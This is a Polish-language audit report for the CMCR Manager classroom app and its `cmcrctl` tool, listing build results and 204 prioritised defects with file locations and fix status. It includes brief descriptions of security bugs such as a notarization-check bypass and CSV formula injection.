# AUDIT – CMCR Manager

Audyt aplikacji CMCR Manager (GUI i `cmcrctl`) względem README, które jest specyfikacją. Gałąź `audit/fixes-and-ui`, punkt wyjścia: `main` @ `c7d00ec` (wersja 1.1.0). Wszystkie testy i zrzuty wykonano wyłącznie w środowisku demo (`Tests/ui/demo-env.sh`) i w testach e2e – bez połączeń z prawdziwymi iMakami, bez konfiguracji użytkownika i bez jego Pęku kluczy.

Plik prowadzi listę wszystkich znalezionych usterek: priorytet, plik i linię (stan sprzed poprawki), opis oraz status – „naprawione” z hashem commita albo „pominięte” z uzasadnieniem.

## Etap 0 – stan wyjściowy

| Sprawdzenie | Wynik |
|---|---|
| `swift build` (debug, czysty katalog `.build`) | kod 0; 5 ostrzeżeń, wszystkie linkera (lista niżej); 0 ostrzeżeń kompilatora Swift |
| `scripts/test.sh` | kod 0; testy jednostkowe: 294 w 32 zestawach (CMCRCoreTests) + 12 (CMCRManagerTests), 0 nieudanych; e2e: 1071 zaliczonych, 0 niezaliczonych (4 min 52 s) |
| `scripts/build-app.sh` (z `CMCR_SIGN_IDENTITY=-`, podpis ad-hoc – bez sięgania do Pęku kluczy) | kod 0; 5 ostrzeżeń linkera (te same co wyżej) |
| `"build/CMCR Manager.app/Contents/MacOS/CMCRManager" --cmcr-self-test` | `1.1.0` = plik `VERSION` |
| `build/cmcrctl selftest` | kod 0: „89 skryptów (treść, tryb użytkownika i root) – składnia bash poprawna” |
| `bash -n` na wszystkich 22 skryptach `*.sh` w repozytorium | wszystkie poprawne |
| Zrzuty „before” | `docs/ui-review/before/` – 12 działów, Ściana ekranów, okno komputera, okno Ustawień (4 zakładki), jasny i ciemny motyw |

Środowisko: macOS 27.0.1 (arm64), Apple Swift 6.4, aktywne Command Line Tools (`xcode-select -p` → `/Library/Developer/CommandLineTools`), SDK MacOSX27.0.

### Ostrzeżenia kompilacji w stanie wyjściowym

Wszystkie pochodzą z linkera i środowiska (Command Line Tools nie mają katalogu `Developer/`), nie z kodu projektu:

```
Package.swift: CMCRCore: ld: warning: search path '/Library/Developer/CommandLineTools/Developer/Library/Frameworks' not found
Package.swift: CMCRManager-product: ld: warning: search path '/Library/Developer/CommandLineTools/Developer/Library/Frameworks' not found
Package.swift: CMCRManager-product: ld: warning: search path '/Library/Developer/CommandLineTools/Developer/usr/lib' not found
Package.swift: cmcrctl-product: ld: warning: search path '/Library/Developer/CommandLineTools/Developer/Library/Frameworks' not found
Package.swift: cmcrctl-product: ld: warning: search path '/Library/Developer/CommandLineTools/Developer/usr/lib' not found
```

### Diagnostyka `-strict-concurrency=complete` (tylko do analizy, nie zostaje w buildzie)

`swift build --scratch-path <tymczasowy> -Xswiftc -strict-concurrency=complete` – kod 0, 45 unikalnych ostrzeżeń Swift:

| Plik | Ostrzeżenia | Rodzaj |
|---|---:|---|
| `Sources/CMCRManager/Components.swift` | 25 | `NSOpenPanel`/`NSSavePanel` (`Pickers`) i koordynator widoku logu bez `@MainActor` |
| `Sources/CMCRCore/JobHistory.swift` | 4 | `ISO8601DateFormatter` przechwycony w zamknięciu `@Sendable` |
| `Sources/CMCRManager/AppModel+Jobs.swift` | 3 | `JobNotifier.router` (statyczna zmienna), `UNUserNotificationCenter` |
| `Sources/CMCRManager/AppModel.swift` | 2 | `runBatch`: operacja `@MainActor` przekazywana do grupy zadań |
| `Sources/CMCRManager/ClassroomModel.swift` | 2 | `snapshots` i `errors` w kodzie współbieżnym |
| `Sources/CMCRManager/ScreenCenter.swift` | 2 | `self` przechwycony w kodzie współbieżnym |
| `Sources/CMCRCore/ScreenCapture.swift` | 2 | `self` przechwycony w kodzie współbieżnym |
| `Sources/cmcrctl/CLI.swift` | 2 | domknięcie `defaultHeader` bez `Sendable` |
| `Sources/CMCRManager/DashboardView.swift`, `RemoteBrowserModel.swift` | 2 | `KeyPathComparator` z `KeyPath` bez `Sendable` |
| `Sources/CMCRManager/MainToolbar.swift` | 1 | `self` w obserwatorze KVO |

Ocena poszczególnych miejsc jest w tabelach usterek (kategoria współbieżności).

## Podsumowanie usterek

| Priorytet | Znalezione | Naprawione | Pominięte | Czeka na decyzję | Otwarte |
|---|---:|---:|---:|---:|---:|
| P0 | 11 | 11 | 0 | 0 | 0 |
| P1 | 28 | 25 | 3 | 0 | 0 |
| P2 | 165 | 8 | 0 | 0 | 157 |
| **Razem** | **204** | **44** | **3** | **0** | **157** |

P0 – awaria, utrata danych lub bezpieczeństwo; P1 – funkcja opisana w README nie działa; P2 – UX, drobne, teksty. Plik i linia wskazują stan sprzed poprawki (gałąź `main` @ `c7d00ec`). Szczegóły każdej pozycji są niżej, w sekcji „Szczegóły”.

## Jak powstała lista

Etap 1 przeprowadziło równolegle 11 agentów analizy, każdy dla jednego obszaru: działy z paska bocznego (Pracownia, Pliki i programy, Administracja), `cmcrctl`, współbieżność i cykl życia okien, polskie teksty oraz interfejs względem Apple HIG. Każdy prześledził funkcje z README ścieżką widok → model → CMCRCore → skrypt bash. Zgłoszenia każdego obszaru sprawdził potem niezależny, sceptyczny recenzent: potwierdził je w kodzie (często uruchamiając fragmenty skryptów lub `cmcrctl` w izolowanej konfiguracji), odrzucił albo zmienił priorytet. Usterki, które recenzenci zauważyli przy okazji, są oznaczone jako „zgłoszone przy weryfikacji” i sprawdzam je przy naprawie. Powtarzające się zgłoszenia różnych agentów są scalone w jedną pozycję („także: …”). Na koniec krytyk kompletności przeczytał README i listę prześledzonych funkcji i wskazał 4 słabo pokryte tematy; ich dodatkowe przeszukanie dało pozycje z obszaru „Dodatkowe przeszukanie” (DOD). Kilka pozycji dodałem sam (obszar „Własne”) po przejrzeniu zrzutów i opisu menu.

## P0 – awarie, utrata danych, bezpieczeństwo

| ID | Obszar | Plik:linia | Usterka | Status |
|---|---|---|---|---|
| [APL-01](#apl-01) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:336` | „override=” w nazwie pliku wyłącza sprawdzanie notaryzacji instalatora | naprawione (2f96309) |
| [CLI-01](#cli-01) | cmcrctl | `Sources/cmcrctl/ClassroomCommands.swift:332` | lesson start wysyła uczniom zawartość bieżącego katalogu, gdy folder materiałów jest pusty | naprawione (88772b3) |
| [DOD-01](#dod-01) | Dodatkowe przeszukanie | `Sources/CMCRCore/Operations+Browse.swift:79` | Pliki od ucznia rozpakowywane na Macu nauczyciela bez kwarantanny, więc Gatekeeper ich nie sprawdza | naprawione (eb069f7) |
| [DOD-02](#dod-02) | Dodatkowe przeszukanie | `Sources/CMCRManager/AppModel.swift:703` | „Steruj ekranem”/VNC łączy się z nazwą .local bez sprawdzenia stanu i zaufania klucza (HostTrust) | naprawione (0d14b5c) |
| [KON-01](#kon-01) | Konfiguracja | `Sources/CMCRCore/HostTrust.swift:169` | Konto zaczynające się od „-” (np. z importowanej listy) wykonuje polecenie na Macu nauczyciela przy sprawdzaniu klucza | naprawione (26edf17) |
| [KON-02](#kon-02) | Konfiguracja | `Sources/CMCRCore/Store.swift:182` | Powtórzone „id” w importowanej liście lub hosts.json powoduje awarię aplikacji przy „Rozpocznij zajęcia” | naprawione (332b819) |
| [PLI-01](#pli-01) | Pliki, przeglądarka | `Sources/CMCRCore/Scripts+Browse.swift:279` | Zmiana nazwy jako root: mv bez -h podąża za dowiązaniem podstawionym po sprawdzeniu | naprawione (8c5e60c) |
| [PRZ-01](#prz-01) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRCore/Scripts.swift:1109` | Szybka naprawa „Włącz Udostępnianie ekranu” włącza VNC bez listy dostępu (dla wszystkich kont, także ucznia) | naprawione (592ad27) |
| [WSP-01](#wsp-01) | Współbieżność | `Sources/CMCRCore/Store.swift:225` | Dziennik działań zapisywany API rzucającym wyjątek – crash przy pełnym dysku | naprawione (a085a2a) |
| [ZAJ-01](#zaj-01) | Zajęcia, podgląd | `Sources/CMCRCore/LessonRoutine.swift:287` | Koniec zajęć: „Wyczyść folder cmcr” kasuje też pliki zapisane po migawce zbierania prac | naprawione (65d8483) |
| [ZAJ-16](#zaj-16) | Zajęcia, podgląd | `Sources/CMCRManager/ClassroomView.swift:470` | Awaria po upływie odliczania końca zajęć: zakres Date()...end z odwróconymi granicami (zgłoszone przy weryfikacji) | naprawione (01a7a70) |

## P1 – funkcje, które nie działają zgodnie z README

| ID | Obszar | Plik:linia | Usterka | Status |
|---|---|---|---|---|
| [APL-02](#apl-02) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Models.swift:292` | Safari i programy spoza folderów Programy ukryte jako „działające w tle” | naprawione (50bc9df) |
| [APL-03](#apl-03) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:219` | Zamykanie aplikacji o nazwach spoza ASCII zgłasza sukces, choć nic nie zamyka | naprawione (0385006) |
| [APL-04](#apl-04) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRManager/AppModel.swift:889` | Nieudane sprawdzenie aktualizacji pokazywane jako „System jest aktualny” | naprawione (9e4ce97) |
| [APL-18](#apl-18) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:696` | „Historia instalacji” pokazuje najstarsze wpisy, a najnowsze aktualizacje są ucinane (zgłoszone przy weryfikacji) | naprawione (7a4fd17) |
| [CLI-02](#cli-02) | cmcrctl | `Sources/cmcrctl/CLI.swift:193` | Skrypt uruchomiony z Terminala bez listy komputerów działa na całej pracowni | naprawione (99e03de) |
| [DOD-03](#dod-03) | Dodatkowe przeszukanie | `Sources/CMCRCore/Scripts.swift:1009` | „Wyloguj natychmiast”, „Wyloguj” i krok „Wyloguj” w „Zakończ zajęcia” pomijają sesje w tle i zgłaszają sukces | naprawione (977ae3f) |
| [DOD-04](#dod-04) | Dodatkowe przeszukanie | `Sources/CMCRManager/PowerView.swift:433` | Sesje w tle (szybkie przełączanie użytkowników) niewidoczne – potwierdzenia restartu, wyłączenia i wylogowania ich nie pokazują ani nie pomijają | naprawione (977ae3f) |
| [KOM-01](#kom-01) | Komputery, zasilanie | `Sources/CMCRManager/PowerView.swift:413` | Powtórzenie restartu/wyłączenia/wylogowania z „Sesja i zasilanie” bez ponownego potwierdzenia | naprawione (a1788d6) |
| [KON-03](#kon-03) | Konfiguracja | `Sources/CMCRCore/Store.swift:195` | Błąd zapisu hosts.json/settings.json nie jest pokazywany – zmiany giną po zamknięciu aplikacji | naprawione (b5d9416) |
| [KON-04](#kon-04) | Konfiguracja | `Sources/CMCRManager/AppModel.swift:232` | Aplikacja nadpisuje zmiany listy zrobione w cmcrctl i nie widzi haseł zmienionych poza nią | naprawione (b15a9e4) |
| [KON-05](#kon-05) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:571` | Po ustawieniu „własnego” hasła ponowne sprawdzenie stanu używa hasła wspólnego | naprawione (e55f3c2) |
| [KON-06](#kon-06) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:915` | Ustawienie „Powiadamiaj o podglądzie” wyłącza komunikat dla ucznia, który README opisuje jako stały | pominięte |
| [PLI-02](#pli-02) | Pliki, przeglądarka | `Sources/CMCRCore/Operations.swift:17` | Archiwum wysyłanych plików w /tmp jest czytelne dla wszystkich (0644) i zostaje po przerwaniu | naprawione (32503a4) |
| [PLI-03](#pli-03) | Pliki, przeglądarka | `Sources/CMCRManager/AppModel.swift:740` | Konwencja cmcr-push oraz cmcrctl push/pull nie rozwijają {student} w folderze ucznia z ustawień | naprawione (797c6cb) |
| [PLI-12](#pli-12) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserModel.swift:81` | Usuwanie i pobieranie obejmuje zaznaczone elementy ukryte filtrem lub wyszukiwaniem | naprawione (3878c61) |
| [PLI-23](#pli-23) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserView.swift:66` | Kliknięcie innego komputera na liście nie przełącza Przeglądarki plików | naprawione (7924cac) |
| [PRZ-03](#prz-03) | Przygotowanie iMaców, uaktualnienia | `Sources/cmcrctl/SetupCommands.swift:47` | cmcrctl setup/readiness/setup-script po cichu pomijają nadmiarowe argumenty – konfiguracja może trafić na inny komputer | naprawione (f07b2af) |
| [PRZ-04](#prz-04) | Przygotowanie iMaców, uaktualnienia | `setup/cmcr-imac-setup.sh:546` | --ssh-key-only wyłącza logowanie hasłem, choć klucz aplikacji nie został zainstalowany (utrata dostępu) | naprawione (4382653) |
| [PRZ-17](#prz-17) | Przygotowanie iMaców, uaktualnienia | `Sources/cmcrctl/SetupCommands.swift:42` | cmcrctl setup-script po cichu ignoruje --verify/--dry-run – plik „do sprawdzenia” wprowadza zmiany jako root (zgłoszone przy weryfikacji) | naprawione (f07b2af) |
| [UI-02](#ui-02) | Interfejs | `Sources/CMCRManager/DashboardView.swift:234` | Menu kontekstowe tabeli działu Komputery działa na jednym, przypadkowym komputerze | naprawione (fe7f85a) |
| [UI-03](#ui-03) | Interfejs | `Sources/CMCRManager/PowerView.swift:99` | „Wyloguj” wylogowuje wszystkie zaznaczone komputery bez arkusza potwierdzenia | naprawione (a1788d6) |
| [UI-04](#ui-04) | Interfejs | `Sources/CMCRManager/RemoteBrowserView.swift:376` | Potwierdzenie usunięcia/zastąpienia w Przeglądarce plików wymienia zaznaczone komputery zamiast przeglądanego | naprawione (fe7f85a) |
| [WSP-02](#wsp-02) | Współbieżność | `Sources/CMCRManager/ClassroomModel.swift:332` | „Przerwij” na partii ostrzeżenia nie przerywa „Zakończ zajęcia” | naprawione (b4be562) |
| [ZAD-01](#zad-01) | Zadania, polecenia | `Sources/CMCRManager/AppModel+Jobs.swift:136` | „Powtórz na nieudanych” używa starej kopii komputera (wspólne hasło, adres, port, usunięte iMaki) | naprawione (e55f3c2) |
| [ZAD-02](#zad-02) | Zadania, polecenia | `Sources/CMCRManager/AppModel+Jobs.swift:508` | „Przerwij zadania i zakończ” nie czeka na zatrzymanie na iMacach ani na zapis historii | naprawione (f4013cd) |
| [ZAJ-03](#zaj-03) | Zajęcia, podgląd | `Sources/CMCRCore/LessonRoutine.swift:237` | Niewysłane materiały raportowane jako „pominięto”, a zajęcia jako „Gotowe” | naprawione (df746f0) |
| [ZAJ-04](#zaj-04) | Zajęcia, podgląd | `Sources/CMCRCore/ScreenCapture.swift:383` | Ponowne zalogowanie na to samo konto nie wyświetla komunikatu o podglądzie | pominięte |
| [ZAJ-05](#zaj-05) | Zajęcia, podgląd | `Sources/CMCRCore/ScreenCapture.swift:623` | Komunikat o podglądzie uznany za wyświetlony przy zablokowanym/uśpionym ekranie | pominięte |

## P2 – UX i drobne

| ID | Obszar | Plik:linia | Usterka | Status |
|---|---|---|---|---|
| [APL-05](#apl-05) | Aplikacje, instalacja, aktualizacje | `README.md:170` | README: instalacja „wyłącznie przez https://”, a kod przyjmuje też file:// | otwarte |
| [APL-06](#apl-06) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:278` | Zabijanie po PID jako root bez sprawdzenia, czyj to proces | otwarte |
| [APL-07](#apl-07) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:297` | Odinstalowanie zabija aplikację wszystkim użytkownikom, zanim sprawdzi, czy da się ją usunąć (Safari zawsze, inne bez Pełnego dostępu do dysku) | otwarte |
| [APL-08](#apl-08) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:415` | Po „Anuluj” w trakcie instalacji z .dmg obraz zostaje zamontowany | otwarte |
| [APL-09](#apl-09) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:564` | „Zainstaluj Homebrew” kończy się sukcesem, gdy pobranie instalatora się nie uda | otwarte |
| [APL-10](#apl-10) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRCore/Scripts.swift:638` | Instalacja aktualizacji ukrywa błąd softwareupdate --list i zgłasza „Brak aktualizacji” | otwarte |
| [APL-12](#apl-12) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRManager/InstallView.swift:96` | Adres instalatora i „Otwórz” nie są przycinane – spacja na początku daje błąd „tylko https://” | otwarte |
| [APL-13](#apl-13) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRManager/InstallView.swift:111` | Homebrew: przecinki w nazwach pakietów (jak w podpowiedzi) psują polecenie | otwarte |
| [APL-14](#apl-14) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRManager/InstallView.swift:185` | „Pokaż zainstalowane” (Unity) wypisuje też wszystkie dostępne wydania | otwarte |
| [APL-15](#apl-15) | Aplikacje, instalacja, aktualizacje | `Sources/CMCRManager/UpdatesView.swift:131` | Po instalacji aktualizacji lista i plakietka nadal pokazują je jako dostępne | otwarte |
| [APL-16](#apl-16) | Aplikacje, instalacja, aktualizacje | `Sources/cmcrctl/CLI.swift:452` | cmcrctl quit-app --force zabija aplikacje bez potwierdzenia (GUI pyta) | otwarte |
| [APL-17](#apl-17) | Aplikacje, instalacja, aktualizacje | `Sources/cmcrctl/CLI.swift:540` | cmcrctl updates install nie pozwala na nową wersję macOS, a komunikat odsyła do przełącznika GUI | otwarte |
| [CLI-03](#cli-03) | cmcrctl | `Sources/cmcrctl/CLI.swift:119` | --help poleceń podstawowych pokazuje całą pomoc zamiast pomocy polecenia | otwarte |
| [CLI-04](#cli-04) | cmcrctl | `Sources/cmcrctl/CLI.swift:474` | kill PID przyjmuje wiele komputerów – zabija przypadkowe procesy jako root | otwarte |
| [CLI-05](#cli-05) | cmcrctl | `Sources/cmcrctl/CLI.swift:576` | cmcrctl logout zawsze wylogowuje natychmiast (bootout) | otwarte |
| [CLI-06](#cli-06) | cmcrctl | `Sources/cmcrctl/ClassroomCommands.swift:196` | report używa ConfigStore.loadHosts() – inna lista i brak ostrzeżenia | otwarte |
| [CLI-07](#cli-07) | cmcrctl | `Sources/cmcrctl/ClassroomCommands.swift:206` | schedule set i ask nie biorą ustawień z classroom.json | otwarte |
| [CLI-08](#cli-08) | cmcrctl | `Sources/cmcrctl/ConfigCommands.swift:54` | Nieudany zapis hosts.json zgłaszany jako sukces (kod 0) | naprawione (b5d9416) |
| [CLI-09](#cli-09) | cmcrctl | `Sources/cmcrctl/ConfigCommands.swift:106` | hosts generate przyjmuje przecinek w prefiksie (hosts add go odrzuca) | otwarte |
| [CLI-10](#cli-10) | cmcrctl | `Sources/cmcrctl/ConfigCommands.swift:122` | hosts generate --replace nadpisuje uszkodzony hosts.json bez kopii .bak | otwarte |
| [CLI-11](#cli-11) | cmcrctl | `Sources/cmcrctl/ScreenWatch.swift:24` | screen-watch: ukryta --notified-user pomija komunikat dla ucznia; brak wpisu w dzienniku | otwarte |
| [CLI-12](#cli-12) | cmcrctl | `Sources/cmcrctl/SelfUpdateCommand.swift:102` | app-update --beta podpowiada instalację bez --beta | otwarte |
| [CLI-13](#cli-13) | cmcrctl | `Sources/cmcrctl/TrustCommand.swift:15` | trust odrzuca -j/--prefix, a nie ma go na liście wyjątków | otwarte |
| [CLI-14](#cli-14) | cmcrctl | `Sources/cmcrctl/TrustCommand.swift:65` | trust: zmieniony klucz zatwierdzany razem z nowymi (jedno pytanie/--yes) | otwarte |
| [CLI-15](#cli-15) | cmcrctl | `Sources/cmcrctl/main.swift:22` | Polecenia modułów nie ostrzegają o uszkodzonym settings.json | otwarte |
| [CLI-16](#cli-16) | cmcrctl | `Sources/CMCRCore/Scripts+Classroom.swift:257` | Komunikat power-later odsyła do nieistniejącego przycisku „Anuluj zaplanowane” (zgłoszone przy weryfikacji) | otwarte |
| [CLI-17](#cli-17) | cmcrctl | `Sources/cmcrctl/ScriptCommands.swift:33` | install bierze istniejący lokalnie plik lub folder o nazwie KOMP (np. „all”) za instalator (zgłoszone przy weryfikacji) | otwarte |
| [CLI-18](#cli-18) | cmcrctl | `Sources/cmcrctl/SetupCommands.swift:42` | setup-script po cichu ignoruje --verify i --dry-run, więc wygenerowany plik wprowadza zmiany (zgłoszone przy weryfikacji) | naprawione (f07b2af) |
| [DOD-05](#dod-05) | Dodatkowe przeszukanie | `Sources/CMCRCore/SSH.swift:716` | Brak zgody macOS na sieć lokalną diagnozowany jako „wyłączony” dla całej pracowni | otwarte |
| [DOD-06](#dod-06) | Dodatkowe przeszukanie | `Sources/CMCRCore/SSH.swift:734` | „Network is unreachable” (Mac nauczyciela bez sieci) pokazywany jako surowy angielski błąd ssh | otwarte |
| [DOD-07](#dod-07) | Dodatkowe przeszukanie | `Sources/CMCRCore/Scripts+Classroom.swift:256` | Opóźnione wyłączenie/restart: ostrzeżenie i pominięcie zalogowanych tylko według stanu z chwili planowania | otwarte |
| [DOD-08](#dod-08) | Dodatkowe przeszukanie | `Sources/CMCRCore/Scripts+Classroom.swift:380` | „Zakończ zajęcia”: „Zamknij aplikacje” zgłasza „aplikacje zamknięte”, gdy nikt nie jest na konsoli | otwarte |
| [DOD-09](#dod-09) | Dodatkowe przeszukanie | `Sources/CMCRCore/Scripts.swift:1026` | Uprzejme „Wyloguj” uznaje sukces, gdy tylko zmieni się właściciel konsoli | naprawione (977ae3f) |
| [DOD-10](#dod-10) | Dodatkowe przeszukanie | `Sources/CMCRManager/AppModel.swift:543` | Przy ProxyJump/ProxyCommand wynik nil sondy portu blokuje pełne sprawdzenie włączonego iMaca | otwarte |
| [DOD-11](#dod-11) | Dodatkowe przeszukanie | `Sources/CMCRManager/AppModel.swift:704` | Adres VNC sklejany bez kodowania – „#”, „/”, „?” w koncie kierują Udostępnianie ekranu do innego hosta niż ssh | naprawione (0d14b5c) |
| [DOD-12](#dod-12) | Dodatkowe przeszukanie | `Sources/CMCRManager/AppModel.swift:704` | „Steruj ekranem” po cichu nic nie robi dla adresu IPv6 (lub z „%”) – brak komunikatu (zgłoszone przy weryfikacji) | naprawione (0d14b5c) |
| [DOD-13](#dod-13) | Dodatkowe przeszukanie | `Sources/CMCRManager/RemoteBrowserComponents.swift:8` | Znaki bidi (U+202A–202E, U+2066–2069) w nazwach plików z iMaców nie są neutralizowane w GUI | otwarte |
| [KOM-02](#kom-02) | Komputery, zasilanie | `Sources/CMCRCore/Classroom.swift:432` | Uszkodzony classroom.json po cichu zastępowany wartościami domyślnymi | otwarte |
| [KOM-03](#kom-03) | Komputery, zasilanie | `Sources/CMCRCore/Scripts+Classroom.swift:297` | Wyłączone przełączniki autorestart/Wake-on-LAN niczego nie wyłączają na iMacu | otwarte |
| [KOM-04](#kom-04) | Komputery, zasilanie | `Sources/CMCRManager/App.swift:562` | Nieaktualny zalogowany uczeń przy wyłączonych komputerach (lista, panel, potwierdzenia) | otwarte |
| [KOM-05](#kom-05) | Komputery, zasilanie | `Sources/CMCRManager/AppModel+Jobs.swift:101` | ⇧⌘O „Zaznacz włączone” i kafelek „Włączone” w trakcie odświeżania kasują zaznaczenie | otwarte |
| [KOM-06](#kom-06) | Komputery, zasilanie | `Sources/CMCRManager/ClassroomModel.swift:521` | Nieudany odczyt nazw/FileVault ignorowany – „sprawdzanie…” bez końca | otwarte |
| [KOM-07](#kom-07) | Komputery, zasilanie | `Sources/CMCRManager/ClassroomModel.swift:548` | Po zmianie nazwy z aktualizacją listy komputer traci zaufany klucz SSH | otwarte |
| [KOM-08](#kom-08) | Komputery, zasilanie | `Sources/CMCRManager/DashboardView.swift:185` | Kliknięcie kafelka z liczbą 0 kasuje zaznaczenie komputerów | otwarte |
| [KOM-09](#kom-09) | Komputery, zasilanie | `Sources/CMCRManager/DashboardView.swift:228` | Kliknięcie wiersza w tabeli „Komputery” zastępuje zaznaczenie (cele działań) | otwarte |
| [KOM-10](#kom-10) | Komputery, zasilanie | `Sources/CMCRManager/HostInspector.swift:138` | Panel szczegółów: „Harmonogram zasilania: nie sprawdzono”, choć stan zawiera harmonogram | otwarte |
| [KOM-11](#kom-11) | Komputery, zasilanie | `Sources/CMCRManager/HostInspector.swift:424` | Błędna odmiana „Sprawdzanie… (N pozostało)” | otwarte |
| [KOM-12](#kom-12) | Komputery, zasilanie | `Sources/CMCRManager/PowerView.swift:302` | Ostrzeżenie o FileVault przed restartem pomija automatyczne odblokowanie | otwarte |
| [KOM-13](#kom-13) | Komputery, zasilanie | `Sources/cmcrctl/CLI.swift:330` | cmcrctl status zapisuje MAC trasy domyślnej, cmcrctl wake nie preferuje Ethernetu ani nie czeka | otwarte |
| [KOM-14](#kom-14) | Komputery, zasilanie | `Sources/CMCRCore/Classroom.swift:563` | Eksport CSV nie neutralizuje formuł – dane kontrolowane przez ucznia wykonują się w arkuszu (zgłoszone przy weryfikacji) | otwarte |
| [KOM-15](#kom-15) | Komputery, zasilanie | `Sources/CMCRManager/HostInspector.swift:282` | „Zmień nazwy komputerów” nie wykrywa kolizji z nazwami niezaznaczonych komputerów (zgłoszone przy weryfikacji) | otwarte |
| [KON-07](#kon-07) | Konfiguracja | `Sources/CMCRCore/HostValidation.swift:27` | Poprawny adres MAC bez separatorów oznaczany jako błędny | otwarte |
| [KON-08](#kon-08) | Konfiguracja | `Sources/CMCRCore/Store.swift:18` | Pusta zmienna CMCR_CONFIG_DIR przenosi dziennik działań w inne miejsce | otwarte |
| [KON-09](#kon-09) | Konfiguracja | `Sources/CMCRManager/ActivityViews.swift:334` | Baner „Nie zapisano hasła administratora” przy samych hasłach „własnych” | otwarte |
| [KON-10](#kon-10) | Konfiguracja | `Sources/CMCRManager/App.swift:77` | Pozycje menu „Przejdź” i „Konfiguracja…” nic nie robią, gdy główne okno jest zamknięte | otwarte |
| [KON-11](#kon-11) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:73` | Widoczność kolumny Port nie jest zapamiętywana | otwarte |
| [KON-12](#kon-12) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:184` | Kolumna Hasło pokazuje „Własne” także, gdy własnego hasła nie ma w Pęku kluczy | otwarte |
| [KON-13](#kon-13) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:382` | Błąd importu listy nie wskazuje miejsca problemu | otwarte |
| [KON-14](#kon-14) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:399` | Generator listy w aplikacji nie sprawdza prefiksu i domeny (cmcrctl je odrzuca) | otwarte |
| [KON-15](#kon-15) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:511` | Własne hasła zastąpionych lub usuniętych wpisów zostają w Pęku kluczy | otwarte |
| [KON-16](#kon-16) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:680` | „Utwórz (nowy) klucz” ignoruje klucz ustawiony w Ustawieniach › Połączenie | otwarte |
| [KON-17](#kon-17) | Konfiguracja | `Sources/CMCRManager/SetupView.swift:762` | „Roześlij klucz” jest aktywne bez pliku .pub i kończy się samym sygnałem dźwiękowym | otwarte |
| [PLI-06](#pli-06) | Pliki, przeglądarka | `Sources/CMCRCore/Operations+Browse.swift:91` | Nazwa komputera z „/” psuje „Zbierz prace” | otwarte |
| [PLI-07](#pli-07) | Pliki, przeglądarka | `Sources/CMCRCore/SSH.swift:735` | Wysyłanie kończy się błędem, gdy pierwszy element ma nazwę zaczynającą się od „-” | otwarte |
| [PLI-08](#pli-08) | Pliki, przeglądarka | `Sources/CMCRCore/Scripts.swift:805` | Nieudany chown przy wysyłaniu daje zadanie „Gotowe” | otwarte |
| [PLI-09](#pli-09) | Pliki, przeglądarka | `Sources/CMCRCore/Scripts.swift:935` | „Pokaż listę plików” nie rozwija ~ (folder w katalogu administratora) | otwarte |
| [PLI-10](#pli-10) | Pliki, przeglądarka | `Sources/CMCRManager/FilesView.swift:80` | Tekst o {console}: „komputery … zostaną pominięte”, a zadania kończą się błędem | otwarte |
| [PLI-11](#pli-11) | Pliki, przeglądarka | `Sources/CMCRManager/FilesView.swift:350` | Podpisy „<nazwa komputera>” przy folderach konwencji, a folder nosi nazwę adresu | otwarte |
| [PLI-13](#pli-13) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserModel.swift:103` | Przełączenie komputera po błędzie wczytywania przenosi ścieżkę poprzedniego iMaca | otwarte |
| [PLI-14](#pli-14) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserModel.swift:196` | Przełącznik „Jako administrator” wraca sam do włączonego | otwarte |
| [PLI-15](#pli-15) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserModel.swift:220` | Zmiany w Przeglądarce pomijane jako „niedostępny”, choć folder właśnie się wczytał | otwarte |
| [PLI-16](#pli-16) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserModel.swift:223` | Wspólny stan activity/notice/lastDownload przy równoległych zmianach w Przeglądarce | otwarte |
| [PLI-17](#pli-17) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserModel.swift:250` | Nazwy plików ucznia trafiają bez zmian do dziennika działań (fałszywe wpisy) | otwarte |
| [PLI-18](#pli-18) | Pliki, przeglądarka | `Sources/CMCRManager/RemoteBrowserView.swift:343` | „Wyślij pliki do tego folderu…” zastępuje istniejące pliki bez pytania | otwarte |
| [PLI-19](#pli-19) | Pliki, przeglądarka | `Sources/cmcrctl/Browse.swift:136` | Inne domyślne sudo w CLI: collect bez root dla prywatnych folderów, push z właścicielem administratora | otwarte |
| [PLI-20](#pli-20) | Pliki, przeglądarka | `Sources/cmcrctl/CLI.swift:431` | cmcrctl ls ŚCIEŻKA KOMP i clean nie rozwijają {student}; clean kończy się kodem 0 bez czyszczenia | otwarte |
| [PLI-24](#pli-24) | Interfejs | `Sources/CMCRManager/RemoteBrowserView.swift:66` | Kliknięcie innego komputera na liście nie przełącza Przeglądarki plików (zgłoszone przy weryfikacji) | naprawione (7924cac) |
| [PRZ-02](#prz-02) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRManager/Updater.swift:468` | „Przypomnij później” nie anuluje zleconej instalacji – po pobraniu aplikacja sama się zamyka i instaluje | otwarte |
